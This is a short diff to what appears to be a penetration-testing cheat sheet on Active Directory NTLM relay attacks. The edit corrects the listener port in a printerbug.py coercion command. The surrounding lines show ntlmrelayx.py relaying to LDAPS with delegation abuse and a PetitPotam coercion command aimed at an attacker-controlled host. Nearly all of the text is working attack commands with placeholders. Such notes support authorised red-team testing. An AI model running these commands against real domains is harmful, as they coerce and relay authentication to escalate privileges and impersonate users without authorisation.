@@ -934,7 +934,7 @@ sudo ntlmrelayx.py -t ldaps://<DC IP> --http-port 8080 --delegate-access
 - - https://github.com/dirkjanm/krbrelayx
 ```
 python3 PetitPotam.py -d <DOMAIN> -u <USER> -p <PASSWORD> <HOSTNAME ATTACKER MACHINE>@8080/a <TARGET>
-python3 printerbug.py <DOMAIN>/<USER>@<TARGET> <HOSTNAME ATTACKER MACHINE>@80/a
+python3 printerbug.py <DOMAIN>/<USER>@<TARGET> <HOSTNAME ATTACKER MACHINE>@8080/a
 ```
 
 #### Check for user to impersonate
